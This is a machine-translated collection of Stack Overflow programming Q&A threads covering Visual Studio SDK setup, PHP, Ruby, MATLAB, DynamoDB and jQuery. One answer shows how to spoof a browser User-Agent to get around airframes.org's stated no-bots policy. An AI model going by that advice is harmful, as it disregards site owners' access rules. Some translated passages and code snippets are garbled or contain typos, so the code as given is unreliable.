在我设置 Visual Studio 2013 后，对于一个简单的 C++ 代码，我遇到了相同的 sdk 错误。我通过以下步骤解决了同样的问题：

*   **选择**Project Properties>Configuration>VC++ Directories>Include Directories**并添加：** c:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Include
*   **选择**项目属性>配置>VC++ 目录>库目录**并添加：** c:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Lib

在该配置之后，我遇到了关于 rc.exe 链接错误的问题。对于这个问题，还需要一件事：

*   从 **C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin**复制**RC.exe**和**RcDll.dll**文件并将它们粘贴到**C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\bin**

 ****在所有这些配置步骤之后，您可以构建一个简单的“Hello World！” 示例并运行，如果你幸运的话。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T08:17:52.407

来自[MSDN 论坛](http://social.msdn.microsoft.com/Forums/en-US/vssetup/thread/176fc806-9ea6-410c-a3c6-b56a84bc39db)：

> 查看此项目的包含目录，我看到以下内容
> 
> $(WindowsSdkDir)包括
> 
> “WindowsSdkDir”被定义为“C:\Program Files (x86)\Windows Kits\8.0\”
> 
> 不幸的是，文件夹“C:\Program Files (x86)\Windows Kits\8.0\Include\”实际上并没有任何头文件。相反，它包含三个子文件夹。其中之一是名为“shared”的文件夹，其中恰好包含错误消息中显示的“SDKDDKVer.h”文件。

如果这是您的情况，请在 VC++ 目录下的项目属性中的包含路径中替换`$(WindowsSdkDir)include`为三个文件夹名称（至少）。`$(WindowsSdkDir)include\shared`

要将此路径永久添加到 VS2012，您需要更改`Microsoft.Cpp.Win32.user.props`文件夹下的`C:\Users\xxx\AppData\Local\Microsoft\MSBuild\v4.0`文件（其中 xxx 是您的用户名）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-26T18:31:56.543

我在 VS2013 上遇到了这个问题。原来，当我先单独安装 Windows SDK 8.1，然后是 Visual Studio 2013 时，它解决了这个问题。

我还应该注意，我将它安装在 Windows 7 w SP 1 VM 上，并且在安装过程中它没有连接到互联网（我在其他地方读过一些人认为安装过程中的互联网连接可以解决问题，但我个人无法验证这一点，现在我已经让它工作了，我不会回溯和测试它）。****

# java - 我如何知道 Castor 是否使用 Xerces 按块从 XML 中解组对象？

> ID：15845270
> 
> 赞同：0
> 
> 时间：2013-04-05T23:36:09.403
> 
> 标签：java, xml-parsing, sax, xerces, castor

我正在使用[Castor](http://castor.codehaus.org/reference-guide.html)来解组 XML 对象。根据其文档，它默认使用 Xerces 解析器。我希望 Castor 在解析新元素时解组对象，而不是将数百个对象编组到内存中。这是因为我要解组一个巨大的 XML 文件。

我有什么方法可以确定 Castor 如何解析 XML 文档？

# php - PHP MSQL 邮件函数拍卖风格

> ID：15845272
> 
> 赞同：0
> 
> 时间：2013-04-05T23:36:24.937
> 
> 标签：php, html

嗨，我需要帮助，我完全卡住了，我正在学习 php，我的老师要我编写一个函数

有针对拍卖中标者和拍卖高出价者的邮寄功能，并通过拍卖到期时间进行测试。我该怎么做，谁能给我看代码？

我必须将任何内容传递给对象或函数吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:38:31.493

请查看[手册](http://php.net/mail)。

句法：

```
bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) 
```

# c# - 如何获得面向的方向和 3D 空间中的点之间的角度

> ID：15845274
> 
> 赞同：0
> 
> 时间：2013-04-05T23:36:41.887
> 
> 标签：c#, trigonometry, vision, angle

我掌握的信息是玩家视线的垂直角度、到问题点的水平角度、到该点的距离以及该点的垂直高度。

如果玩家没有向上或向下看（垂直角度），我已经想出了如何使用以下方法获得角度。

```
float GetVisionAngle(float angleHoriz, float angleVert, float distance, float height)
{
double A = Math.Cos(angleHoriz * (Math.PI / 180)) * distance);
double hypotenuse = Math.Sqrt(distance * distance + height * height);
return (float)(Math.Acos(A / hypotenuse) * (180 / Math.PI));
} 
```

![推导空间点与玩家视觉方向之间角度的原始方法](https://i.stack.imgur.com/dVYH0.jpg)

我想不通的是，如果玩家的视线方向被垂直角度（向上或向下看）修改，如何获得该角度。这几天我脑子里一直在考虑这个问题，但我想不出办法来做到这一点。

我正在使用它来生成视锥截止。当检查对象的可见性时，我必须处理的信息是对象与玩家的角度、到该对象的距离及其高度。这个初始范围检查将返回玩家视线方向的角度，并确定对象是否可见。

![墙壁设置为透明以显示视野范围](https://i.stack.imgur.com/DLta7.png)

这是使用@HABO 提供的解决方案进行调试的代码截图。不幸的是，它总是导致 NaN 错误。

![NaN 似乎总是被返回。](https://i.stack.imgur.com/1omK3.jpg)

在使用它们之前将角度转换为弧度似乎可以解决很多数值错误。我不明白最后将前面的数字转换为最终角度的公式。 ![这是一组新的数字，使用一些更容易处理的数字](https://i.stack.imgur.com/ufjsR.jpg)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:04:08.500

```
aH = Angle in the horizontal plane between the line of sight (LOS) and the object.  (angleHoriz)

aV = Angle in the vertical plane of the LOS.  (angleVert)

d = Distance to the object in the horizontal plane.  (distance)

h = Height of the object above the horizontal plane.  (height)

dO = Distance from the origin to the object.
   = sqrt( d * d + h * h )

oH = Horizontal offset from the LOS to the object at the base of the wall.
   = sin( aH ) * d

dH = Horizontal distance from the origin to the wall.
   = cos( aH ) * d

hLOS = Height at which the LOS intersects the wall.
     = tan( aV ) * dH

dLOS = Distance from the observer to the LOS at the wall.
     = sqrt( dH * dH + hLOS * hLOS )

dW = Distance along the wall between the line of sight and the object.
   = sqrt( oH * oH + ( h - hLOS ) * ( h - hLOS ) )

answer = acos( ( dLOS * dLOS + dO * dO - dW * dW ) / ( 2 * dLOS * dO ) ) 
```

# python - py2exe - MSVCR90.dll

> ID：15845280
> 
> 赞同：2
> 
> 时间：2013-04-05T23:37:21.560
> 
> 标签：python, py2exe, msvcr90.dll

我正在尝试用 py2exe 构建一个 Python 程序。尝试运行构建的程序时出现此错误：

```
The program can't start because MSVCR90.dll is missing from your computer. Try reinstalling the program to fix this problem. 
```

我已经安装了 Visual C++ 2008 Redistributable Package，而不是 SP1 版本。是什么赋予了？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:42:43.080

查看来自 [https://superuser.com/questions/351609/how-can-i-fix-a-missing-msvcr90-dll-file-error的响应](https://superuser.com/questions/351609/how-can-i-fix-a-missing-msvcr90-dll-file-error)

```
Just when I thought I was going to have to wipe the computer and reinstall everything to fix the problem, I decided to uninstall applications one at a time to see if one was conflicting.
 I uninstalled these apps...
 Zetafax Client Applications
 Visual Studio 2005 Tools for Office Second Edition Runtime
 Microsoft Silverlight
 I then performed yet another repair on Office Home and Business 2010, rebooted and voila - Excel is working again.
 I've since reinstalled Zetafax Client Applications and Microsoft Silverlight with all the latest Windows Updates and Excel is still working.
 I think the conflict was with "Visual Studio 2005 Tools for Office Second Edition Runtime", though I've no idea which application installed this in the first place.
 Problem solved.
 This issue now appears to have been solved with a Windows Update. We encountered the same issue again with another machine. Uninstalling the apps listed here and repairing Office didn't help, but running the latest batch of updates that came out on Tuesday 14th February 2012 seems to have fixed the issue. 
```

# php - PHP - 获取 php 文件中的信息表单注释

> ID：15845282
> 
> 赞同：0
> 
> 时间：2013-04-05T23:37:39.623
> 
> 标签：php

请告诉我一种简单有效的方式来阅读或获取信息（无论它是什么？）形成 php 文件中的评论，而我知道 wordpress 使用此功能。

就像我有一个名为的文件夹`theme`，并且有三个带有此注释的文件：

在第一个文件中

```
/* Template Name: page */ 
```

在第二个文件中

```
/* Template Name: category */ 
```

在第三个文件

```
/* Template Name: Tags */ 
```

那我是怎么得到一个数组的，请给个`page`解决办法`category``tags`

谢谢你的时间

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:46:42.753

要削减 php 文件，您可以执行以下操作：

```
$str = file_get_contents("/path/to/file1"); 
```

比你完整的 php 文件代码在那里，你需要使用一些正则表达式来获取评论内容

* * *

### 例子：

让我们假设`$str`有你的 php 源代码，正则表达式可能是这样的：

```
$str = "/* Template Name: page */\n bla bla blah";

preg_match( "#/\* Template Name: (\w*) \*/#", $str, $m);

var_dump( $m ); 
```

* * *

之前的代码输出：

```
array(2) {
  [0]=>
  string(25) "/* Template Name: page */"
  [1]=>
  string(4) "page"
} 
```

您需要的存储在`$m[1]`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:59:20.397

```
$source = file_get_contents($filename);
$tokens = token_get_all($source);
foreach($tokens as $token){
    if( ($token[0] == T_COMMENT || $token[0] == T_DOC_COMMENT)
       && preg_match('/Template Name: (.*)/',$token[1],$match){
       echo "Template name is ".$match[1];
    }
} 
```

# matlab - svds 不适用于某些矩阵 - 结果错误

> ID：15845283
> 
> 赞同：1
> 
> 时间：2013-04-05T23:37:40.873
> 
> 标签：matlab, linear-algebra

这是我的测试功能：

```
 function diff = svdtester()

            y = rand(500,20);
            [U,S,V] = svd(y);

            %{
            y = sprand(500,20,.1);
            [U,S,V] = svds(y);
            %}

            diff_mat = y - U*S*V';
            diff = mean(abs(diff_mat(:)));

            end 
```

有两个非常相似的部分：一个找到随机矩阵的 SVD，另一个找到随机稀疏矩阵的 SVD。无论您选择评论哪一个（现在第二个已被注释掉），我们都会计算原始矩阵与其 SVD 分量的乘积之间的差异，并返回该平均绝对差异。

使用 rand/svd 时，典型的返回（平均误差）值在 8.8e-16 左右，基本上为零。当使用 sprand/svds 时，典型的返回值大约是 0.07，考虑到稀疏矩阵从 90% 开始是 0，这是相当糟糕的。

我是否误解了 SVD 应该如何处理稀疏矩阵，或者这些函数有什么问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-06T00:00:12.297

是的， 的行为`svds`与`svd`. 根据 MA​​TLAB 的文档：

> `[U,S,V] = svds(A,...)`返回三个输出参数，如果`A`是`m`-by- `n`：
> 
> `U`由`m`正交`k`列组成
> 
> `S`是`k`对角线`k`_
> 
> `V`由`n`正交`k`列组成
> 
> `U*S*V'`是最接近的秩`k`近似`A`

事实上，通常`k`会是关于 的东西`6`，所以你会得到相当“粗鲁”的近似值。要获得更精确的近似值，请指定`k`为`min(size(y))`：

```
[U, S, V] = svds(y, min(size(y))) 
```

并且您将得到与 情况相同数量级的误差`svd`。

PS 另外，MATLAB 的文档说：

> Note`svds`最适合用于查找大型稀疏矩阵的几个奇异值。要找到这样一个矩阵的所有奇异值，`svd(full(A))`通常会比`svds(A,min(size(A)))`.

# amazon-web-services - 将具有动态列的 DynamoDB 表备份到 S3

> ID：15845286
> 
> 赞同：0
> 
> 时间：2013-04-05T23:37:48.123
> 
> 标签：amazon-web-services, hive, boto, amazon-dynamodb, amazon-emr

我已经阅读了有关此内容的其他几篇文章，尤其是这个[问题](https://stackoverflow.com/questions/13630641/backup-aws-dynamodb-to-s3)，其中 greg 回答了如何在 Hive 中执行此操作。我想知道如何解释具有可变列数的 DynamoDB 表？

也就是说，原始 DynamoDB 表的行是通过不同的列动态添加的。我试图查看 Amazon 在其 DataPipeLine 服务中使用的 exportDynamoDBToS3 脚本，但它的代码如下所示，似乎没有映射列：

```
-- Map DynamoDB Table
CREATE EXTERNAL TABLE dynamodb_table (item map<string,string>)
STORED BY 'org.apache.hadoop.hive.dynamodb.DynamoDBStorageHandler'
TBLPROPERTIES ("dynamodb.table.name" = "MyTable"); 
```

（顺便说一句，我也尝试过使用 Datapipe 系统，但发现它相当令人沮丧，因为我无法从文档中弄清楚如何执行简单的任务，例如运行 shell 脚本而不会一切都失败。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T17:40:36.040

事实证明，我在原始问题中发布的 Hive 脚本工作得很好，但前提是您使用的是正确版本的 Hive。似乎即使将 install-hive 命令设置为安装最新版本，使用的版本实际上也取决于 AMI 版本。

经过一番搜索后，我设法在亚马逊的文档中找到了以下内容（强调我的）：

> 创建一个引用存储在 Amazon DynamoDB 中的数据的 Hive 表。这与前面的示例类似，只是您没有指定列映射。该表必须恰好有一列类型为 map。如果您随后在 Amazon S3 中创建 EXTERNAL 表，则可以调用 INSERT OVERWRITE 命令将数据从 Amazon DynamoDB 写入 Amazon S3。您可以使用它在 Amazon S3 中创建 Amazon DynamoDB 数据的存档。因为没有列映射，所以无法查询以这种方式导出的表。**在Hive 0.8.1.5 或更高版本**中可以在不指定列映射的情况下导出数据， **Amazon EMR AMI 2.2.3 及更高版本**支持该功能。

[http://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EMR_Hive_Commands.html](http://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EMR_Hive_Commands.html)

# c# - .NET HTTP POST 方法 - Cookies AirFrames.org

> ID：15845293
> 
> 赞同：0
> 
> 时间：2013-04-05T23:38:13.943
> 
> 标签：c#, post, cookies, httpwebrequest

尝试使用 C# 将 HttpWebRequest 发布到 airframes.org 以获取飞机信息。这是我用于许多其他 POST 请求且没有问题的代码（与其他 url 一起使用），但它/我无法使用 ICAO24 编号 (A64294) 加载 airframes.org 页面。

```
 var cookies = new CookieContainer();
        ServicePointManager.Expect100Continue = false;

        var request = (HttpWebRequest)WebRequest.Create("http://www.airframes.org/");
        request.CookieContainer = cookies;
        request.Method = "POST";
        request.KeepAlive = true;

        request.ContentType = "application/x-www-form-urlencoded";
        using (var requestStream = request.GetRequestStream())
        using (var writer = new StreamWriter(requestStream))
        {
            writer.Write("reg=&selcal=&icao24=A64294&submit=submit");
        }

        using (var responseStream = request.GetResponse().GetResponseStream())
        using (var reader = new StreamReader(responseStream))
        {
            var result = reader.ReadToEnd();
            Console.WriteLine(result);

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:57:53.183

请注意，该网站[有无机器人政策](http://www.airframes.org/nobots.php)，这就是您的请求不起作用的原因。

话虽如此，如果您仍然希望请求该页面，添加一个用户代理字符串（因此您的请求看起来像是来自浏览器）就可以了：

```
request.UserAgent = "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1"; 
```

尊重网站的政策通常是个好主意。上面的代码仅用于教育目的。

# php - 在已经在 PHP 中的 HTML 中添加 PHP 代码？

> ID：15845296
> 
> 赞同：0
> 
> 时间：2013-04-05T23:38:25.057
> 
> 标签：php, html, variables, syntax

基本上，我想在 HTML 中添加一个 PHP 变量，该 HTML 已经被插入到 PHP 代码中的常量中。这就是我的意思：（显然下面的代码是错误的，但想象一下我想在 iFrame 的 URL 中插入 $VARIABLE，例如）

```
<?php
$VARIABLE = 'example-sub-category';
const EXAMPLE = "<iframe src='http://example.com/$VARIABLE'></iframe>";
?> 
```

在其中添加该变量的语法是什么？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:45:23.687

这只是一个基本模板。 `str_replace()`应该做的伎俩。

```
const EXAMPLE = "<iframe src='http://example.com/{{{VARIABLE}}}'></iframe>";
$variable = 'example-sub-category

$merged_content = str_replace('{{{variable}}}', $variable, EXAMPLE); 
```

注意我曾经`{{{}}}`表示插入。这不是 PHP 语法，但您会发现模板经常使用类似文本中不会出现的东西来表示占位符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T01:03:25.737

要在 html 中移入和移出 php，请使用`<?`[php code here...] 并`?>`结束 php 并继续使用 html。您可以使用反斜杠 \ 转义字符，并使用上面提到的 Rujikin 单引号。或者，在 PHP 中，您可以回显您的 html，这样您就不会跳入和跳出 php。

例如：

```
some php...
echo '<span style=\"color:#980000\"><strong>\"{$searchTerm}\"</strong></span>';
more php... 
```

请注意，html 用单引号（端到端）括起来，在单引号内，在 html 需要的地方使用双引号，例如`<style>`标记。

这个例子基本上是说，“无论 php 变量的值是什么，都回显`$searchTerm`它，将它放在回显所需的引号中，并使其成为深蓝色 ( `#0000FF`) 和粗体 ( `<strong>`)。

我希望这有帮助。:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T23:42:21.993

你有没有尝试过：

```
<?php
    $VARIABLE = 'example-sub-category';
    const EXAMPLE = "<iframe src='http://example.com/".$VARIABLE."'></iframe>";
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T23:42:48.907

只需定义标签，您就可以在 HTML 中的任何位置插入 PHP`<?php ?>`

```
<iframe src='http://example.com/<?php echo $VARIABLE; ?>'></iframe> 
```

使用您的示例：

```
const EXAMPLE = "<iframe src='http://example.com/" . $VARIABLE . "'></iframe>"; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-05T23:48:00.360

对于这种任务，我最好使用 sprintf：

```
$VARIABLE = 'example-sub-category';
const EXAMPLE = "<iframe src='http://example.com/%s'></iframe>";

echo sprintf(self::EXAMPLE, $VARIABLE); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2013-04-05T23:42:54.753

您可以尝试以下方法：

```
<?php
$VARIABLE = 'example-sub-category';
const EXAMPLE = "<iframe src='http://example.com/$VARIABLE'></iframe>";

$newHtml = str_replace('$VARIABLE', $VARIABLE);
?> 
```

* * *

正如您提到的，您的代码是假的，所以我想您需要用在执行 php 脚本之前未知的内容替换 HTML 字符串中的某些地方，对吗？

因此，您需要放置一些占位符并稍后更改它们，如我在上面的片段中所示。

希望这有效

# python - 使用python教程进行主成分分析（PCA）

> ID：15845303
> 
> 赞同：1
> 
> 时间：2013-04-05T23:39:46.327
> 
> 标签：python, numpy, face-recognition, pca

是否有任何机构有使用 python 进行主成分分析 (PCA) 的教程，包括代码和解释？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:42:57.427

用于数据处理的模块化工具包可能会有所帮助： http: [//mdp-toolkit.sourceforge.net/](http://mdp-toolkit.sourceforge.net/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-05T18:38:41.063

我推荐Sebastian Raschka[的 3 个简单步骤中的主成分分析。](http://sebastianraschka.com/Articles/2015_pca_in_3_steps.html)

> 主成分分析 (PCA) 是一种简单但流行且有用的线性变换技术，可用于许多应用，例如股票市场预测、基因表达数据分析等。在本教程中，我们将看到 PCA 不仅仅是一个“黑匣子”，我们将通过 3 个基本步骤来了解其内部结构。

它有一个关于 PCA 的简短介绍，带有精美图像的示例，使用[pandas](http://pandas.pydata.org/)，并且完全基于 Python 制作。

# c++ - 如何使用 WMI (Windows Management Instrumentation) 获取特定设备使用的内存范围

> ID：15845307
> 
> 赞同：0
> 
> 时间：2013-04-05T23:39:56.967
> 
> 标签：c++, windows-8, wmi, wmi-query, pci

知道特定设备的名称和/或 DeviceID 和/或 Pci 总线编号、设备编号和功能编号，如何获取特定设备使用的资源（特别是内存范围）？例如，我想知道英特尔 AHCI 控制器使用的内存范围。通过查询 "SELECT * FROM Win32_IDEController WHERE Name LIKE\"%ahci%\"" 我可以获得一些信息，例如完整名称、设备 ID 和其他信息。然后我认为使用完整的名称或设备 ID，我可以使用“Win32_DeviceMemoryAddress”类选择设备使用的内存范围。但是，这个类没有任何有用的属性，我可以设置这些属性来获取与 AHCI 控制器关联的内存范围。Name、Caption 和 description 都返回一个带有起始地址和结束地址的字符串。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-05T16:10:40.817

不知道如何使用`WMI`，但在[此链接](http://www.codeproject.com/Articles/14412/Enumerating-windows-device)中，在“获取设备资源”下，作者声称[CM_Get_Next_Res_Des](http://msdn.microsoft.com/en-us/library/windows/hardware/ff538600%28v=vs.85%29.aspx)提供了此信息。然而，到达那里并不简单......这正是我现在想要完成的......当我到达那里时会提供更多细节......

# ruby-on-rails - ruby 数组（可枚举）方法在 1 次操作中选择和拒绝为 2 个数组

> ID：15845311
> 
> 赞同：9
> 
> 时间：2013-04-05T23:41:28.097
> 
> 标签：ruby-on-rails, ruby, enumerable

```
# this code works
list = (0..20).to_a
# => [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] 

odd = list.select { |x| x.odd? }
# => [1, 3, 5, 7, 9, 11, 13, 15, 17, 19] 

list.reject! { |x| x.odd? }
# => [0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20] 

# but can i emulate this type of functionality with an enumerable method?
set = [1,5,10]
# => [1, 5, 10] 
one, five, ten = set
# => [1, 5, 10] 
one
# => 1 
five
# => 5 
ten
# => 10

# ------------------------------------------------
# method I am looking for ?
list = (0..20).to_a
odd, even = list.select_with_reject { |x| x.odd? }
# put the matching items into the first variable
# and the non-matching into the second 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-05T23:51:42.500

当然，你可以这样做：

```
odd, even = list.partition &:odd? 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:50:49.603

```
odd = []
even = []
list = [1..20]
list.each {|x| x.odd? ? odd << x : even << x } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T00:04:32.940

正如pguardiario所说，`partition`方法是最直接的方法。你也可以使用`Set#divide`：

```
require 'set'
list = (1..10).to_a
odd, even = Set.new(list).divide(&:odd?).to_a.map{|x| x.to_a} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-06T06:14:08.450

你可以试试下面：

```
odd,even = (0..20).group_by(&:odd?).values
p odd,even 
```

*输出：*

```
[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20]
[1, 3, 5, 7, 9, 11, 13, 15, 17, 19] 
```

# php - PHP 条件标签

> ID：15845314
> 
> 赞同：-4
> 
> 时间：2013-04-05T23:41:33.483
> 
> 标签：php, html

当当前页面为“work.php”时，我正在尝试更改 SVG 的颜色

使用以下代码

```
<?php if($page=='work'){echo 'white';} else{echo '#C22533';}?> 
```

即使我在“work.php”上，我也始终获得颜色“#C22533”

我该如何更正这个 PHP 代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:01:38.903

尝试这个：

```
<?php
    echo (stripos($_SERVER['PHP_SELF'], 'work.php')) ? 'white' : '#C22533';
?> 
```

或者，使用您的`$page`变量：

```
<?php
    $page = 'work';
    echo (stripos($_SERVER['PHP_SELF'], $page.'.php')) ? 'white' : '#C22533';
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:44:45.490

利用

```
<?php
    if(pathinfo(__FILE__, PATHINFO_FILENAME) == 'work')
    {
        echo 'white';
    }
    else
    {
        echo '#C22533';
    }
?> 
```

# php - 将用户组添加到 Luracast Restler API

> ID：15845316
> 
> 赞同：0
> 
> 时间：2013-04-05T23:41:55.940
> 
> 标签：php, api, restler

我正在尝试使用示例类“AccessControl”在使用 Luracast Restler 开发的 API 中添加用户组，该类实现来自 Restler 的 iAuthenticate 类。

文件：[https ://gist.github.com/anonymous/d6a315d1f29dc7722b7d](https://gist.github.com/anonymous/d6a315d1f29dc7722b7d)

我遇到的问题是 AccessControl::__isAllowed() 中定义的方法，如下所示：

```
Resources::$accessControlFunction = 'AccessControl::verifyAccess'; 
```

AccessControl::verifyAccess 永远不会被调用，所以我不能使用

```
$m['class']['AccessControl']['properties']['requires'] 
```

阅读在 API 中调用的方法的要求。

我添加的令牌系统只是一个唯一标识符，它基于用户在使用正确信息处理 POST /user/token 时获得的许多标准。

我怎样才能使这项工作像它应该的那样工作？根据 Restler 的文档，我应该能够像我一样定义一个方法，并且它应该返回一个布尔值，就像它一样。但它永远不会被调用，所以......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:01:25.160

男孩，我是不是觉得自己很傻。原来我实际上并不需要 $accessControlFunction。我只需要在我的 Test.php 类中使用 {@Requires ...} 而不是 {@requires ...} 。

加油，好人！

# javascript - 如何隐藏我动态创建的 div？

> ID：15845317
> 
> 赞同：2
> 
> 时间：2013-04-05T23:41:58.793
> 
> 标签：javascript, jquery

我创建了一个脚本，该脚本根据 li 元素的数量创建 div，并且该部分工作正常。现在我想做的是**隐藏这些 div**（动态创建），但它不起作用。有人可以告诉我我在这里做错了什么吗？谢谢！！
[在这里提琴](http://jsfiddle.net/utTre/)

我的代码：

```
$(document).ready(function(){
$(".create").click(function(){
i='';
var count = $("li").length;
for(var i=0;i<count;i++){
$('<div class="mydiv" style="width:100px;height:100px;background-color:red;border:1px solid #000000;"></div>').appendTo('body');
}
});

$('.check').click(function(){
var getDivs= $('div').length;
alert(getDivs);
});
//Why is this not working?
$('div').click(function(){
$(this).hide();
});
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T23:45:29.310

尝试这样做（并在创建 div 时附加点击事件）：

```
$('<div class="mydiv" style="width:100px;height:100px;background-color:red;border:1px solid #000000;"></div>')
.click(function(){
 $(this).hide();
})
.appendTo('body'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T23:45:59.827

所有这些代码都应该在 jQuery 中准备好。问题是您的事件在创建元素之前就被绑定了。

```
$(document).ready(function(){
    $(".create").click(function(){
        i='';
        var count = $("li").length;

        for(var i=0;i<count;i++){
            $('<div class="mydiv" style="width:100px;height:100px;background-color:red;border:1px solid #000000;"></div>').appendTo('body');
        }
        $('.check').click(function(){
            var getDivs= $('div').length;
            alert(getDivs);
        });
        //Now working
        $('div').click(function(){
            $(this).hide();
        });
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T23:46:44.517

尝试

```
$(document).on('click', 'div', function () {
 $(this).hide();
 )}; 
```

# php - 不同的头文件 Wordpress

> ID：15845318
> 
> 赞同：0
> 
> 时间：2013-04-05T23:41:59.783
> 
> 标签：php, wordpress, header

我做了一个wordpress主题，我有一些头文件。我想出现在外观>菜单上，例如：

```
- 标题
-- 标题 1
-- 标题 2
-- 标题 3

```

使用 Header 1、2 和 3 调用 header1.php、header2.php、header3.php 文件。我怎样才能做到这一点？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T15:31:26.767

标题是您添加的菜单，标题 1 / 2 / 3 是子菜单，那么您必须遵循以下文章：

[http://codex.wordpress.org/Function_Reference/add_theme_page](http://codex.wordpress.org/Function_Reference/add_theme_page) [http://codex.wordpress.org/Function_Reference/add_submenu_page](http://codex.wordpress.org/Function_Reference/add_submenu_page)

# mongodb - 聚合具有未知键名的子文档

> ID：15845323
> 
> 赞同：0
> 
> 时间：2013-04-05T23:42:35.253
> 
> 标签：mongodb

我有一组具有以下结构的文档：

```
"_id" : "20130104/activity",
"hourly" : {
    "0" : {
        "activity1" : 25,
        "activity2" : 10
    },
    "1" : {
        "activity1" : 25,
        "activity2" : 10,
        "activity3" : 5
    },
    "2" : {
        "activity1" : 25,
        "activity2" : 10,
        "activity3" : 5
    }
    } 
```

我希望能够汇总这些数据，以便能够生成每月和每日统计数据，如此处显示的文档：

```
"date" : "20130104",
"total" : {
        "activity1" : 75,
        "activity2" : 30,
        "activity3" : 10
          } 
```

我的问题是我事先不知道每小时子文档中的键名 - 这使得使用聚合框架非常困难。（或者也许我只是误解了一些东西）。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T04:31:11.023

此处可以使用 map reduce 来计算报告数据，因为您不需要知道键的名称。另一种方法是，因为我们一天 24 小时，您总是可以拥有一个具有 24 小时密钥的文档，然后您就可以轻松地使用聚合框架。即使这种方法也会给你带来性能提升，这是常见的模式

# php - WP单个帖子上显示的类别名称不正确

> ID：15845330
> 
> 赞同：0
> 
> 时间：2013-04-05T23:43:30.813
> 
> 标签：php, wordpress

我正在编辑一个多年前由另一位开发人员为我的客户建立的 WP 网站，我们没有与之联系。

在单个帖子页面上，有一个标题显示类别名称。对于其中一个类别的帖子，出于某种原因，它显示的是父类别的名称，而不是子类别的名称。有两个具有相同父级的类别（“新闻”和“事件”）——“事件”显示正确，“新闻”不正确。

显示类别名称的代码如下所示：

```
<h2 class="section_header"> 
    <?php
    $category = get_the_category();
    echo $category[0]->cat_name;
    ?>
</h2> 
```

[这是一个例子](http://www.sechc.org/en/happenings/news/accepting-new-patients/)。正如您在地址栏中看到的那样，这篇文章被归类为“新闻”，但它在标题中显示了父类别（“事件”）。

作为比较，您可以查看[此帖子](http://www.sechc.org/en/happenings/events/breast-cancer-prevention-makes-a-difference/)，该帖子属于“事件”类别，其父级也是“发生”，但它显示了正确的类别标题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T21:34:11.910

在勾选要在哪些类别下提交帖子时，无需勾选父级。从帖子中取消选中父类别只会显示子类别名称。

# javascript - 如何在另一个 JavaScript 函数中调用变量或函数

> ID：15845331
> 
> 赞同：1
> 
> 时间：2013-04-05T23:43:31.093
> 
> 标签：javascript

我正在使用这个 JavaScript Spinner/loader 项目[http://fgnass.github.io/spin.js/](http://fgnass.github.io/spin.js/)

我在这里的 JSFiddle 上有一些代码[http://jsfiddle.net/jasondavis/9pBsr/](http://jsfiddle.net/jasondavis/9pBsr/)显示了我的进度，它可能看起来对我拥有的所有功能有点矫枉过正，但我​​已经删除了这篇文章的所有非相关内容. 因此，如果您能帮助我，请保持所有结构不变。

现在我的问题。我正在使用的库有这个代码来显示微调器

```
var spinner = new Spinner(opts).spin(target); 
```

文档说要杀死并隐藏微调器以在其上运行`stop`函数，`Spinner`但是我的代码的结构方式，我不确定如何访问它，因为我不断收到类似的错误

`TypeError: Cannot call method 'stop' of undefined`

我的最终结果是能够调用它并让它停止/杀死微调器......

```
zPanel.loader.hideLoader() 
```

这是我的 JavaScript，但所有 JS 和 HTML 都在这个 JSFiddle [http://jsfiddle.net/jasondavis/9pBsr/](http://jsfiddle.net/jasondavis/9pBsr/)

请帮我获取`zPanel.loader.hideLoader()`调用函数的`zPanel.loader.buildSpinner()`函数`Spinner.stop()`

```
var zPanel = {

    init: function() {
        $(document).ready(function() {
